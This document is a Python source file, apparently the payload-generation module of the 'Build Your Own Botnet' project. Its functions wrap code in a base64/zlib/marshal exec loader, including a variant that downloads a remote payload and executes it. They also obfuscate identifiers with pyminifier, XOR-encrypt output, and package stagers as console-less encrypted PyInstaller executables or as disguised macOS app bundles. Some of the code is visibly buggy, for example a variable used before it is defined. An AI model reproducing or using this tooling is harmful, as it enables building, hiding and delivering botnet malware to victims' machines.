#!/usr/bin/python
# -*- coding: utf-8 -*-
'Code Generators (Build Your Own Botnet)'

# standard library
import os
import sys
import imp
import zlib
import base64
import random
import marshal
import tempfile
import subprocess

# modules
import util
import security

# globals
__Template_main  = """
if __name__ == '__main__':
    _{0} = {1}({2})
    """

__Template_plist = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleDevelopmentRegion</key>
<string>English</string>
<key>CFBundleExecutable</key>
<string>%s</string>
<key>CFBundleGetInfoString</key>
<string>%s</string>
<key>CFBundleIconFile</key>
<string>%s</string>
<key>CFBundleIdentifier</key>
<string>%s</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundleName</key>
<string>%s</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleShortVersionString</key>
<string>%s</string>
<key>CFBundleSignature</key>
<string>????</string>
<key>CFBundleVersion</key>
<string>%s</string>
<key>NSAppleScriptEnabled</key>
<string>YES</string>
<key>NSMainNibFile</key>
<string>MainMenu</string>
<key>NSPrincipalClass</key>
<string>NSApplication</string>
</dict>
</plist>
"""
__Template_spec = """# -*- mode: python -*-
block_cipher = pyi_crypto.PyiBlockCipher(key='[128_BIT_KEY]')
a = Analysis(['[PY_FILE]'],
             pathex=['[DIST_PATH]'],
             binaries=[],
             datas=[],
             hiddenimports=[HIDDEN_IMPORTS],
             hookspath=[],
             runtime_hooks=[],
             excludes=['site'],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name='[NAME]',
          debug=False,
          strip=False,
          upx=False,
          runtime_tmpdir=None,
          console=False, icon='[ICON_PATH]')
"""


# main
def compress(input, url=False):
    """ 
    Zip-compress output into self-executing script

    Returns compressed output as a string

    """
    return "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(input, '', 'exec')), 9)))) if not url else "import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode(urllib.urlopen({}).read()))))".format(repr(input))

def obfuscate(input):
    """ 
    Obfuscate and minimize memory footprint of output

    `Requires`
    :param str output:    output to obfuscate

    Returns obfuscated output as a string

    """
    temp = tempfile.NamedTemporaryFile(suffix='.py', delete=False)
    if os.path.isfile(input):
        input = open(input, 'r').read()
    temp.file.write(input)
    temp.file.close()
    name = os.path.join(tempfile.gettempdir(), temp.name)
    obfs = subprocess.Popen('pyminifier -o {} --obfuscate-classes --obfuscate-functions --obfuscate-variables --obfuscate-builtins --replacement-length=1 {}'.format(name, name), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
    obfs.wait()
    output = open(name, 'r').read()
    os.remove(name)
    return output

def encrypt(input, key):
    """ 
    Encrypt output with XOR stream cipher
    and 128-bit key

    `Requires`
    :param str output:    output to obfuscate

    Returns obfuscated output as a string
    """
    try:
        key = base64.b64decode(key)
    except TypeError: pass
    return security.encrypt_xor(input, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0))

def variable(length=6):
    """ 
    Generate a random alphanumeric variable name of given length

    `Optional`
    :param int length:    length of the variable name to generate

    Returns variable as a string
    """
    return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(length)-1))

def snippet(template='main', function='main', *args, **kwargs):
    """ 
    Generate a output snippet using the given template

    `Templates`
        - main:  
                if __name__ == '__main__':
                     _function = Function(*args, **kwargs)   

    `Required`
    :param str template:    name of template
    :param str function:    function name to use

    `Optional`
    :param tuple args:      positional arguments
    :param dict kwargs:     keyword arguments

    Returns code snippet as a string
    
    """
    def main():
        options = ', '.join(args) + str(', '.join(str("{}={}".format(k, v) if bool(v.count('{') > 0 and v.count('{') > 0) else "{}='{}'".format(k,v)) for k,v in kwargs.items()) if len(kwargs) else '')
        return __Template_main.format(function.lower(), function, options)
    if template in locals():
        return locals()[template]()
    else:
        raise ValueError("invalid argument 'template' (valid: main)")

def exe(filename, icon=None):
    """ 
    Compile the Python stager file into a standalone executable
    with a built-in Python interpreter

    `Required`
    :param str icon:        icon image filename
    :param str filename:    target filename

    Returns output filename as a string
    
    """
    try:
        filename = os.path.join(tempfile.gettempdir(), os.path.basename(filename))
        pyname   = os.path.basename(filename)
        name     = os.path.splitext(pyname)[0]
        dist     = os.path.abspath('.')
        key      = util.variable(16)
        icon     = icon if os.path.isfile(icon) else None
        pkgs     = list(set([i.strip().split()[1] for i in open(filename).read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import'] + [i.strip().split()[1] for i in open(filename,'r').read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import' if len(str(i.strip().split()[1])) < 35]))
        spec     = __Template_spec.replace('[HIDDEN_IMPORTS]', str(pkgs)).replace('[ICON_PATH]', icon).replace('[PY_FILE]', pyname).replace('[DIST_PATH]', dist).replace('[NAME]', name).replace('[128_BIT_KEY]', key)
        fspec    = os.path.join(dist, name + '.spec')
        with file(fspec, 'w') as fp:
            fp.write(fspec)
        try:
            pyinst = subprocess.check_output('where PyInstaller' if os.name == 'nt' else 'which PyInstaller', shell=True).strip().rstrip()
        except:
            raise Exception("missing package 'PyInstaller' is required to compile .py into a standalone executable binary")
        make = subprocess.Popen('{} -m {} {}'.format(sys.executable, pyinst, fspec), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
        if globals()['_debug']:
            while True:
                if make.poll():
                    try:
                        util.display(make.stdout.readline())
                    except:
                        pass
                else:
                    break
        else:
            make.wait()
        if not make.returncode == 0:
            raise Exception("failed to compile executable: {}".format(str().join((make.communicate()))))
        exe   = os.path.join((dist, 'dist', name, '.exe' if os.name == 'nt' else ''))
        build = map(util.delete, (filename, fspec, os.path.join(dist, 'build')))
        return exe
    except Exception as e:
        util.__logger__.error('Method {} returned error: {}'.format(exe.func_name, str(e)))

def app(filename, icon=None):
    """ 
    Bundle the Python stager file into a Mac OS X application

    `Required`
    :param str icon:        icon image filename
    :param str filename:    target filename

    Returns output filename as a string
    """
    try:
        iconFile        = icon if os.path.isfile(icon) else None
        version         = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
        baseName        = os.path.basename(filename)
        bundleName      = os.path.splitext(baseName)[0]
        pkgPath         = os.path.join(basePath, 'PkgInfo')
        appPath         = os.path.join(os.getcwd(), '%.app' % bundleName)
        basePath        = os.path.join(appPath, 'Contents')
        distPath        = os.path.join(basePath, 'MacOS')
        rsrcPath        = os.path.join(basePath, 'Resources')
        plistPath       = os.path.join(rsrcPath, 'Info.plist')
        iconPath        = os.path.basename(iconFile)
        executable      = os.path.join(distPath, filename)
        bundleVersion   = '%s %s'  % (bundleName, version)
        bundleIdentity  = 'com.%s' % bundleName
        infoPlist       = __Template_plist % (baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
        os.makedirs(distPath)
        os.mkdir(rsrcPath)
        with file(pkgPath, "w") as fp:
            fp.write("APPL????")
        with file(plistPath, "w") as fw:
            fw.write(infoPlist)
        os.rename(filename, os.path.join(distPath, baseName))
        return appPath
    except Exception as e:
        util.__logger__.error('Method {} returned error: {}'.format(app.func_name, str(e)))
